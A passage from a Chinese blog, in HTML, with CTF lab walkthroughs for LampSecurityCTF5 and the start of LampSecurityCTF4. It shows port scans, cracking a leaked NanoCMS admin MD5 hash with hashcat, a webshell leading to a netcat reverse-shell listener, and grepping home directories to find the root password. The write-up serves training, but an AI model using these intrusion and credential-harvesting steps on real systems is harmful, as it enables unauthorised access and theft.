class="hljs-keyword">for</span> 192.168.80.171<br>Host is up (0.00054s latency).<br><br>PORT      STATE  SERVICE<br>22/udp    closed ssh<br>25/udp    closed smtp<br>80/udp    closed http<br>110/udp   closed pop3<br>111/udp   open   rpcbind<br>143/udp   closed imap<br>445/udp   closed microsoft-ds<br>901/udp   closed smpnameres<br>3306/udp  closed mysql<br>37282/udp closed unknown<br>MAC Address: 00:0C:29:9A:0F:07 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.51 seconds<br></code></pre></td></tr></table></figure><p>开放了挺多端口 还是以web端口为主</p><h3 id="Web信息收集"><a href="#Web信息收集" class="headerlink" title="Web信息收集"></a>Web信息收集</h3><p>通过<code>http://192.168.80.171/~andy/data/nanoadmin.php</code>发现目标存在nanocms</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221220173446608.png" alt="image-20221220173446608"></p><h3 id="通过开源情报找到目标存在信息泄露"><a href="#通过开源情报找到目标存在信息泄露" class="headerlink" title="通过开源情报找到目标存在信息泄露"></a>通过开源情报找到目标存在信息泄露</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221220173730443.png" alt="image-20221220173730443"></p><h3 id="访问-x2F-data-x2F-pagesdata-txt"><a href="#访问-x2F-data-x2F-pagesdata-txt" class="headerlink" title="访问&#x2F;data&#x2F;pagesdata.txt"></a>访问&#x2F;data&#x2F;pagesdata.txt</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;homepage&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;links_cats&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sidebar&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">4</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">2</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">12</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;other-pages&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">14</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;top-navigation&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;4&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Footer-Right&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;4&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;slugs&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;home&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">4</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;contact&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">12</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;contact1&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;titles&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Home&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">4</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Contact&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">12</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Contact1&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;slug_count&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">12</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;settings&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">19</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;index-last-modified&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1234513760</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;def-template-areas&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;website name&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">2</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">14</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;website slogan&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">3</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;below navigation&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">4</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;copyright notice&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;def-template-links&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">14</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;top-navigation&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">12</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Footer-Right&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">13</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;active-tweaks&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deutsch&quot;</span>;i<span class="hljs-punctuation">:</span><span class="hljs-number">1</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">19</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;language-pack-tweak&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lang-select&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;english&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;seourl&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;0&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;username&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;password&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">32</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">7</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;version&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;v_4f&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>通过上面的信息泄露发现一个账号admin密码为9d2f75377ac0ab991d40c91fd27e52fd</p><p>识别为MD5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF5]<br>└─$ hash-identifier 9d2f75377ac0ab991d40c91fd27e52fd<br>   <span class="hljs-comment">#########################################################################</span><br>   <span class="hljs-comment">#     __  __                     __           ______    _____           #</span><br>   <span class="hljs-comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span><br>   <span class="hljs-comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span><br>   <span class="hljs-comment">#     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span><br>   <span class="hljs-comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br>   <span class="hljs-comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span><br>   <span class="hljs-comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span><br>   <span class="hljs-comment">#                                                             By Zion3R #</span><br>   <span class="hljs-comment">#                                                    www.Blackploit.com #</span><br>   <span class="hljs-comment">#                                                   Root@Blackploit.com #</span><br>   <span class="hljs-comment">#########################################################################</span><br>--------------------------------------------------<br><br>Possible Hashs:<br>[+] MD5<br>[+] Domain Cached Credentials - MD4(MD4((<span class="hljs-variable">$pass</span>)).(strtolower(<span class="hljs-variable">$username</span>)))<br></code></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF5]<br>└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz &amp;&amp; hashcat -m 0 -a 0 9d2f75377ac0ab991d40c91fd27e52fd /usr/share/wordlists/rockyou.txt<br>[sudo] password <span class="hljs-keyword">for</span> neil:<br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>============================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-12th Gen Intel(R) Core(TM) i7-12700H, 2904/5872 MB (1024 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>9d2f75377ac0ab991d40c91fd27e52fd:shannon<br></code></pre></td></tr></table></figure><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>通过admin:shannon登录后台</p><p>写入webshell</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221220174359671.png" alt="image-20221220174359671"></p><h3 id="成功getshell"><a href="#成功getshell" class="headerlink" title="成功getshell"></a>成功getshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/Documents/LampSecurityCTF5]<br>└─$ nc -nvlp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.80.158] from (UNKNOWN) [192.168.80.171] 47990<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-3.2$ <span class="hljs-built_in">ls</span><br>README FIRST.txt<br>data<br>gnu-license-mini.txt<br>index.php<br>nanocms_v0.4_final<br>style.css<br>bash-3.2$ <span class="hljs-built_in">whoami</span><br>apache<br>bash-3.2$ <span class="hljs-built_in">uname</span> -a<br>Linux localhost.localdomain 2.6.23.1-42.fc8 <span class="hljs-comment">#1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux</span><br></code></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ <span class="hljs-built_in">cat</span> /etc/passwd |grep /bin/bash<br>root:x:0:0:root:/root:/bin/bash<br>patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash<br>jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash<br>andy:x:502:502:Andrew Carp:/home/andy:/bin/bash<br>loren:x:503:503:Loren Felt:/home/loren:/bin/bash<br>amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash<br>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br>cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash<br></code></pre></td></tr></table></figure><p>因为用户足够多，所以可以针对用户进行信息收集寻找有价值的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ grep -R -i pass /home/* 2&gt;/dev/null <span class="hljs-comment"># 使用grep搜索和password相关的文件信息 -R 递归 -i 忽略大小写</span><br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;title&gt;Root password&lt;/title&gt;<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;text xml:space=<span class="hljs-string">&quot;preserve&quot;</span>&gt;&lt;note-content version=<span class="hljs-string">&quot;0.1&quot;</span>&gt;Root password<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password<br>/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password<br>/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM [DEBUG]: Saving <span class="hljs-string">&#x27;Root password&#x27;</span>...<br>/home/patrick/.tomboy.log:12/5/2012 7:25:03 AM [DEBUG]: Saving <span class="hljs-string">&#x27;Root password&#x27;</span>...<br><br><br>bash-3.2$ <span class="hljs-built_in">cat</span> /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;note version=<span class="hljs-string">&quot;0.2&quot;</span> xmlns:<span class="hljs-built_in">link</span>=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy/link&quot;</span> xmlns:size=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy/size&quot;</span> xmlns=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy&quot;</span>&gt;<br>  &lt;title&gt;Root password&lt;/title&gt;<br>  &lt;text xml:space=<span class="hljs-string">&quot;preserve&quot;</span>&gt;&lt;note-content version=<span class="hljs-string">&quot;0.1&quot;</span>&gt;Root password<br><br>Root password<br><br>50<span class="hljs-variable">$cent</span>&lt;/note-content&gt;&lt;/text&gt;<br>  &lt;last-change-date&gt;2012-12-05T07:24:52.7364970-05:00&lt;/last-change-date&gt;<br>  &lt;create-date&gt;2012-12-05T07:24:34.3731780-05:00&lt;/create-date&gt;<br>  &lt;cursor-position&gt;15&lt;/cursor-position&gt;<br>  &lt;width&gt;450&lt;/width&gt;<br>  &lt;height&gt;360&lt;/height&gt;<br>  &lt;x&gt;0&lt;/x&gt;<br></code></pre></td></tr></table></figure><p>通过<code>50$cent</code>  <code>su root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ python -c <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>bash-3.2$ su root<br>su root<br>Password: 50<span class="hljs-variable">$cent</span><br><br>[root@localhost public_html]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LampSecurityCTF4</title>
    <link href="/2022/12/20/LampSecurityCTF4/"/>
    <url>/2022/12/20/LampSecurityCTF4/</url>
    
    <content type="html"><![CDATA[<p>简单靶机</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>确定目标为192.168.80.170</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ sudo masscan -p 1-65535 --rate 10000 192.168.80.170<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-12-20 06:23:56 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [65535 ports/host]<br>Discovered open port 80/tcp on 192.168.80.170<br>Discovered open port 22/tcp on 192.168.80.170<br>Discovered open port 25/tcp on 192.168.80.170<br><br>┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ sudo nmap -sV -sC -O 192.168.80.170 -p22,80,25<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 14:26 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.170<br>Host is up (0.00053s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 4.3 (protocol 2.0)<br>| ssh-hostkey:<br>|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)<br>|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)<br>25/tcp open  smtp    Sendmail 8.13.5/8.13.5<br>| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.80.158], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP<br>|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="hljs-string">&quot;HELP &lt;topic&gt;&quot;</span>. 2.0.0 To report bugs <span class="hljs-keyword">in</span> the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For <span class="hljs-built_in">local</span> information send email to Postmaster at your site. 2.0.0 End of HELP info<br>80/tcp open  http    Apache httpd 2.2.0 ((Fedora))<br>| http-robots.txt: 5 disallowed entries<br>|_/mail/ /restricted/ /conf/ /sql/ /admin/<br>|_http-title:  Prof. Ehks<br>|_http-server-header: Apache/2.2.0 (Fedora)<br>MAC Address: 00:0C:29:DF:AF:0F (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6<br>OS details: Linux 2.6.16 - 2.6.21, Linux 2.6.8 - 2.6.30<br>Network Distance: 1 hop<br>Service Info: Host: ctf4.sas.upenn.edu; OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.64 seconds<br><br>┌──(neil㉿kali)-[~/Documents/LampSecurityCTF4]<br>└─$ sudo nmap -sU 192.168.80.170 -p22,80,25<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 14:26 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.170<br>Host is up (0.00033s latency).<br><br>PORT   STATE    SERVICE<br>22/udp filtered ssh<br>25/udp filtered smtp<br>80/udp filtered http<br>MAC Address: 00:0C:29:DF:AF:0F (VMware)<br></code></pre></td></tr></table></figure><p>可以发现开放了22, 25, 80三个端口</p><h3 id="简单漏扫"><a href="#简单漏扫" class="headerlink" title="简单漏扫"></a>简单漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 